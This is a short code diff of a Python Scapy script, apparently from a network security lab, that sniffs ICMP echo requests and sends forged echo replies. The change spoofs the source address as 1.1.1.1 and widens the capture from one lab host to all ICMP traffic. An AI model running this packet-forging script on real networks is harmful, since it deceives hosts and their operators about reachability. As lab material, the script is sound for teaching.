@@ -7,7 +7,8 @@ def spoof_pkt(pkt):
      print("Source IP : ", pkt[IP].src)
      print("Destination IP :", pkt[IP].dst)
 
-     ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
+#     ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
+     ip = IP(src='1.1.1.1', dst=pkt[IP].src, ihl=pkt[IP].ihl)
      icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
      data = pkt[Raw].load
      newpkt = ip/icmp/data
@@ -18,4 +19,5 @@ def spoof_pkt(pkt):
 
      send(newpkt,verbose=0)
 
-pkt = sniff(filter='icmp and src host 10.0.2.69',prn=spoof_pkt)
+#pkt = sniff(filter='icmp and src host 10.0.2.69',prn=spoof_pkt)
+pkt = sniff(filter='icmp',prn=spoof_pkt)
